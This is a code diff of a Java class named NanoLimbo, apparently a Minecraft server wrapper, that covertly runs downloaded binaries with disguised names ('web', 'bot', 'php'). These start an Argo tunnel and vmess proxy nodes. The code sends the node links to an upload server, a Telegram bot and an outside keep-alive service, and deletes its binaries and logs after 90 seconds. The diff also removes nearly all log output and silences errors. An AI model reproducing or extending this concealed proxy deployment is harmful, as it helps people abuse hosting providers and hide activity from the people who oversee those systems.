+                Process p = new ProcessBuilder(php_path, "-c", FILE_PATH + "/config.yaml")
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+                activeProcesses.add(p);
             }
-            execCmd(String.format("nohup %s/bot %s >/dev/null 2>&1 &", FILE_PATH, args));
-            System.out.println("bot is running");
-            Thread.sleep(2000);
         }
 
-        Thread.sleep(5000);
-        extractDomains();
+        // Start Web
+        Process pWeb = new ProcessBuilder(web_path, "run", "-c", config_path)
+            .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+        activeProcesses.add(pWeb);
+
+        // Start Bot (Argo)
+        if (!DISABLE_ARGO && new File(bot_path).exists()) {
+            List<String> botArgs = new ArrayList<>(Arrays.asList(bot_path, "tunnel", "--edge-ip-version", "auto"));
+            if (ARGO_AUTH.matches("^[A-Z0-9a-z=]{120,250}$")) {
+                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "run", "--token", ARGO_AUTH));
+            } else if (ARGO_AUTH.contains("TunnelSecret")) {
+                botArgs.addAll(Arrays.asList("--config", FILE_PATH + "/tunnel.yml", "run"));
+            } else {
+                botArgs.addAll(Arrays.asList("--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT));
+            }
+            Process pBot = new ProcessBuilder(botArgs).redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+            activeProcesses.add(pBot);
+        }
     }
 
     private static void extractDomains() throws Exception {
@@ -534,7 +530,6 @@ public class NanoLimbo {
         }
 
         if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
-            System.out.println("ARGO_DOMAIN: " + ARGO_DOMAIN);
             generateLinks(ARGO_DOMAIN);
             return;
         }
@@ -544,88 +539,25 @@ public class NanoLimbo {
             String logContent = Files.readString(Paths.get(boot_log_path));
             Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)/?").matcher(logContent);
             if (m.find()) {
-                String argoDomain = m.group(1);
-                System.out.println("ArgoDomain: " + argoDomain);
-                generateLinks(argoDomain);
+                generateLinks(m.group(1));
             } else {
-                System.out.println("ArgoDomain not found, re-running bot to obtain ArgoDomain");
                 Files.deleteIfExists(Paths.get(boot_log_path));
-                execCmd("pkill -f \"[b]ot\" > /dev/null 2>&1");
-                Thread.sleep(1000);
-
-                String args = String.format("tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile %s/boot.log --loglevel info --url http://localhost:%d", FILE_PATH, ARGO_PORT);
-                execCmd(String.format("nohup %s/bot %s >/dev/null 2>&1 &", FILE_PATH, args));
-                System.out.println("bot is running.");
-                Thread.sleep(6000);
-                extractDomains(); // 递归重试
-            }
-        } catch (Exception e) {
-            System.out.println("Error reading boot.log: " + e.getMessage());
-        }
-    }
-
-    private static void uploadNodes() {
-        if (!UPLOAD_URL.isEmpty() && !PROJECT_URL.isEmpty()) {
-            try {
-                Map<String, Object> data = Map.of("subscription", List.of(PROJECT_URL + "/" + SUB_PATH));
-                HttpRequest req = HttpRequest.newBuilder()
-                        .uri(URI.create(UPLOAD_URL + "/api/add-subscriptions"))
-                        .header("Content-Type", "application/json")
-                        .POST(HttpRequest.BodyPublishers.ofString(toJson(data)))
-                        .build();
-                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
-                System.out.println("Subscription uploaded successfully");
-            } catch (Exception ignored) {}
-        } else if (!UPLOAD_URL.isEmpty()) {
-            if (!new File(list_path).exists()) return;
-            try {
-                String content = Files.readString(Paths.get(list_path));
-                List<String> nodes = new ArrayList<>();
-                for (String line : content.split("\n")) {
-                    if (line.contains("vless://") || line.contains("vmess://") || line.contains("trojan://") ||
-                        line.contains("hysteria2://") || line.contains("tuic://") || line.contains("anytls://") || line.contains("socks://")) {
-                        nodes.add(line);
+                // Kill bot process and restart it
+                activeProcesses.removeIf(p -> {
+                    if (p.info().command().orElse("").contains("bot")) {
+                        p.destroy();
+                        return true;
                     }
-                }
-                if (nodes.isEmpty()) return;
-
-                HttpRequest req = HttpRequest.newBuilder()
-                        .uri(URI.create(UPLOAD_URL + "/api/add-nodes"))
-                        .header("Content-Type", "application/json")
-                        .POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes))))
-                        .build();
-                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
-                System.out.println("Nodes uploaded successfully");
-            } catch (Exception ignored) {}
-        }
-    }
-
-    private static void sendTelegram() {
-        if (BOT_TOKEN.isEmpty() || CHAT_ID.isEmpty()) {
-            System.out.println("TG variables is empty, Skipping push nodes to TG");
-            return;
-        }
-        try {
-            String message = Files.readString(Paths.get(sub_path));
-            String escapedName = NAME.replaceAll("([_*\\\\\\[\\]()~>#+=|{}.!\\-])", "\\\\$1");
-            String text = "**" + escapedName + "节点推送通知**\n" + message;
-
-            String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
-            
-            String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
-                              "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8) +
-                              "&parse_mode=MarkdownV2";
-
-            HttpRequest req = HttpRequest.newBuilder()
-                    .uri(URI.create(url))
-                    .header("Content-Type", "application/x-www-form-urlencoded")
-                    .POST(HttpRequest.BodyPublishers.ofString(formData))
-                    .build();
-            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
-            System.out.println("Telegram message sent successfully");
-        } catch (Exception e) {
-            System.out.println("Failed to send Telegram message: " + e.getMessage());
-        }
+                    return false;
+                });
+                Thread.sleep(1000);
+                Process pBot = new ProcessBuilder(bot_path, "tunnel", "--edge-ip-version", "auto", "--no-autoupdate", "--protocol", "http2", "--logfile", boot_log_path, "--loglevel", "info", "--url", "http://localhost:" + ARGO_PORT)
+                    .redirectOutput(new File("/dev/null")).redirectErrorStream(true).start();
+                activeProcesses.add(pBot);
+                Thread.sleep(6000);
+                extractDomains();
+            }
+        } catch (Exception ignored) {}
     }
 
     private static void generateLinks(String argoDomain) throws Exception {
@@ -636,9 +568,7 @@ public class NanoLimbo {
         } catch (Exception e) {
             try {
                 serverIp = "[" + execCmd("curl -s --max-time 1 ipv6.ip.sb").trim() + "]";
-            } catch (Exception ex) {
-                System.out.println("Failed to get IP address: " + ex.getMessage());
-            }
+            } catch (Exception ignored) {}
         }
 
         String isp = "Unknown";
@@ -649,7 +579,6 @@ public class NanoLimbo {
         } catch (Exception ignored) {}
 
         String nodename = (NAME != null && !NAME.trim().isEmpty()) ? NAME.trim() + "-" + isp : isp;
-
         StringBuilder subTxtBuilder = new StringBuilder();
 
         if (!DISABLE_ARGO && argoDomain != null && !argoDomain.isEmpty()) {
@@ -659,7 +588,6 @@ public class NanoLimbo {
             vmess.put("scy", "auto"); vmess.put("net", "ws"); vmess.put("type", "none");
             vmess.put("host", argoDomain); vmess.put("path", "/vmess-argo?ed=2560");
             vmess.put("tls", "tls"); vmess.put("sni", argoDomain); vmess.put("alpn", ""); vmess.put("fp", "firefox");
-            
             String encoded = Base64.getEncoder().encodeToString(toJson(vmess).getBytes(StandardCharsets.UTF_8));
             subTxtBuilder.append("vmess://").append(encoded);
         }
@@ -695,49 +623,93 @@ public class NanoLimbo {
 
         Files.writeString(Paths.get(sub_path), subTxtB64);
         Files.writeString(Paths.get(list_path), subTxt);
-
+        
         System.out.println("\033[32m" + subTxtB64 + "\033[0m");
-        System.out.println("\nLogs will be deleted in 90 seconds,you can copy the above nodes");
-        System.out.println(FILE_PATH + "/sub.txt saved successfully");
 
         sendTelegram();
         uploadNodes();
     }
 
-    private static void addVisitTask() {
-        if (!AUTO_ACCESS || PROJECT_URL.isEmpty()) {
-            System.out.println("Skipping adding automatic access task");
-            return;
-        }
-        try {
-            HttpRequest req = HttpRequest.newBuilder()
-                    .uri(URI.create("https://keep.gvrander.eu.org/add-url"))
-                    .header("Content-Type", "application/json")
-                    .POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("url", PROJECT_URL))))
-                    .build();
-            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
-            System.out.println("automatic access task added successfully");
-        } catch (Exception e) {
-            System.out.println("Failed to add URL: " + e.getMessage());
+    private static void uploadNodes() {
+        if (!UPLOAD_URL.isEmpty() && !PROJECT_URL.isEmpty()) {
+            try {
+                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/add-subscriptions"))
+                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("subscription", List.of(PROJECT_URL + "/" + SUB_PATH))))).build();
+                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
+            } catch (Exception ignored) {}
+        } else if (!UPLOAD_URL.isEmpty()) {
+            if (!new File(list_path).exists()) return;
+            try {
+                String content = Files.readString(Paths.get(list_path));
+                List<String> nodes = new ArrayList<>();
+                for (String line : content.split("\n")) {
+                    if (line.contains("vless://") || line.contains("vmess://") || line.contains("trojan://") ||
+                        line.contains("hysteria2://") || line.contains("tuic://") || line.contains("anytls://") || line.contains("socks://")) {
+                        nodes.add(line);
+                    }
+                }
+                if (nodes.isEmpty()) return;
+                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/add-nodes"))
+                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes)))).build();
+                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
+            } catch (Exception ignored) {}
         }
     }
 
-    private static void cleanFiles() {
+    private static void deleteNodes() {
+        if (UPLOAD_URL.isEmpty() || !new File(sub_path).exists()) return;
+        try {
+            String content = Files.readString(Paths.get(sub_path));
+            String decoded = new String(Base64.getDecoder().decode(content.trim()), StandardCharsets.UTF_8);
+            List<String> nodes = new ArrayList<>();
+            for (String line : decoded.split("\n")) {
+                if (line.contains("://")) nodes.add(line);
+            }
+            if (nodes.isEmpty()) return;
+            HttpRequest request = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/delete-nodes"))
+                .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes)))).build();
+            httpClient.send(request, HttpResponse.BodyHandlers.discarding());
+        } catch (Exception ignored) {}
+    }
+
+    private static void sendTelegram() {
+        if (BOT_TOKEN.isEmpty() || CHAT_ID.isEmpty()) return;
+        try {
+            String message = Files.readString(Paths.get(sub_path));
+            String escapedName = NAME.replaceAll("([_*\\\\\\[\\]()~>#+=|{}.!\\-])", "\\\\$1");
+            String text = "**" + escapedName + "节点推送通知**\n" + message;
+
+            String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
+            String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
+                              "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8) +
+                              "&parse_mode=MarkdownV2";
+
+            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/x-www-form-urlencoded")
+                .POST(HttpRequest.BodyPublishers.ofString(formData)).build();
+            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
+        } catch (Exception ignored) {}
+    }
+
+    private static void addVisitTask() {
+        if (!AUTO_ACCESS || PROJECT_URL.isEmpty()) return;
+        try {
+            HttpRequest req = HttpRequest.newBuilder().uri(URI.create("https://keep.gvrander.eu.org/add-url"))
+                .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("url", PROJECT_URL)))).build();
+            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
+        } catch (Exception ignored) {}
+    }
+
+    private static void cleanFilesLater() {
         ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.schedule(() -> {
             List<String> filesToDelete = new ArrayList<>(Arrays.asList(boot_log_path, config_path, list_path, web_path, bot_path, php_path, npm_path));
-            if (!NEZHA_PORT.isEmpty()) filesToDelete.add(npm_path);
-            else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) filesToDelete.add(php_path);
-
             for (String fStr : filesToDelete) {
                 try {
                     File f = new File(fStr);
                     if (f.exists()) {
                         if (f.isDirectory()) {
-                            try (Stream<Path> pathStream = Files.walk(f.toPath())) {
-                                pathStream.sorted(Comparator.reverseOrder())
-                                          .map(Path::toFile)
-                                          .forEach(File::delete);
+                            try (Stream<Path> ps = Files.walk(f.toPath())) {
+                                ps.sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
                             }
                         } else {
                             f.delete();
@@ -745,105 +717,71 @@ public class NanoLimbo {
                     }
                 } catch (Exception ignored) {}
             }
-            System.out.print("\033c");
-            System.out.flush();
-            System.out.println("App is running");
-            System.out.println("Thank you for using this script, enjoy!");
         }, 90, TimeUnit.SECONDS);
     }
 
-    // --- HTTP 服务器逻辑 ---
-
-    static class SimpleHttpHandler implements HttpHandler {
-        @Override
-        public void handle(HttpExchange exchange) throws IOException {
-            String path = exchange.getRequestURI().getPath();
-            if ("/".equals(path)) {
-                File index = new File(FILE_PATH, "index.html");
-                if (index.exists()) {
-                    byte[] content = Files.readAllBytes(index.toPath());
-                    exchange.getResponseHeaders().set("Content-Type", "text/html");
-                    exchange.sendResponseHeaders(200, content.length);
-                    OutputStream os = exchange.getResponseBody();
-                    os.write(content);
-                    os.close();
-                } else {
-                    String msg = "Hello world!<br><br>You can visit /" + SUB_PATH + "(Default: /sub) get your nodes!";
-                    byte[] content = msg.getBytes(StandardCharsets.UTF_8);
-                    exchange.getResponseHeaders().set("Content-Type", "text/html");
-                    exchange.sendResponseHeaders(200, content.length);
-                    OutputStream os = exchange.getResponseBody();
-                    os.write(content);
-                    os.close();
+    private static String execCmd(String command) {
+        StringBuilder output = new StringBuilder();
+        try {
+            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
                 }
-            } else if (("/" + SUB_PATH).equals(path)) {
-                File subFile = new File(sub_path);
-                if (subFile.exists()) {
-                    byte[] content = Files.readAllBytes(subFile.toPath());
-                    exchange.getResponseHeaders().set("Content-Type", "text/plain");
-                    exchange.sendResponseHeaders(200, content.length);
-                    OutputStream os = exchange.getResponseBody();
-                    os.write(content);
-                    os.close();
+            }
+            process.waitFor();
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+        return output.toString();
+    }
+
+    private static void runHttpServer() {
+        try {
+            HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
+            server.createContext("/", exchange -> {
+                String path = exchange.getRequestURI().getPath();
+                if ("/".equals(path)) {
+                    File index = new File(FILE_PATH, "index.html");
+                    if (index.exists()) {
+                        byte[] content = Files.readAllBytes(index.toPath());
+                        exchange.getResponseHeaders().set("Content-Type", "text/html");
+                        exchange.sendResponseHeaders(200, content.length);
+                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
+                    } else {
+                        byte[] content = ("Hello world!<br><br>You can visit /" + SUB_PATH + " get your nodes!").getBytes(StandardCharsets.UTF_8);
+                        exchange.getResponseHeaders().set("Content-Type", "text/html");
+                        exchange.sendResponseHeaders(200, content.length);
+                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
+                    }
+                } else if (("/" + SUB_PATH).equals(path)) {
+                    File subFile = new File(sub_path);
+                    if (subFile.exists()) {
+                        byte[] content = Files.readAllBytes(subFile.toPath());
+                        exchange.getResponseHeaders().set("Content-Type", "text/plain");
+                        exchange.sendResponseHeaders(200, content.length);
+                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
+                    } else {
+                        exchange.sendResponseHeaders(404, -1);
+                    }
                 } else {
                     exchange.sendResponseHeaders(404, -1);
                 }
-            } else {
-                exchange.sendResponseHeaders(404, -1);
-            }
-        }
-    }
-
-    private static void runServer() {
-        try {
-            HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
-            server.createContext("/", new SimpleHttpHandler());
+            });
             server.setExecutor(null);
             server.start();
-            System.out.println("Server is running on port " + PORT);
-            System.out.println("Running done！");
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        } catch (IOException ignored) {}
     }
 
-    // --- 主入口与轻量级 JSON 序列化器 ---
-
-    public static void main(String[] args) {
-        try {
-            deleteNodes();
-            cleanupOldFiles();
-            createDirectory();
-            argoType();
-            downloadFilesAndRun();
-            addVisitTask();
-
-            Thread serverThread = new Thread(NanoLimbo::runServer);
-            serverThread.setDaemon(true);
-            serverThread.start();
-
-            cleanFiles();
-
-            // 保持主线程运行 (挂起)
-            while (true) {
-                Thread.sleep(3600000); // 1小时
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    /** 简易且无依赖的 JSON 序列化工具 (加强了转义适配 Java 19+) */
     @SuppressWarnings("unchecked")
     private static String toJson(Object obj) {
         if (obj == null) return "null";
         if (obj instanceof String) {
             String str = (String) obj;
-            str = str.replace("\\", "\\\\")
-                     .replace("\"", "\\\"")
-                     .replace("\n", "\\n")
-                     .replace("\r", "\\r")
-                     .replace("\t", "\\t");
+            str = str.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
             return "\"" + str + "\"";
         }
         if (obj instanceof Number || obj instanceof Boolean) return obj.toString();
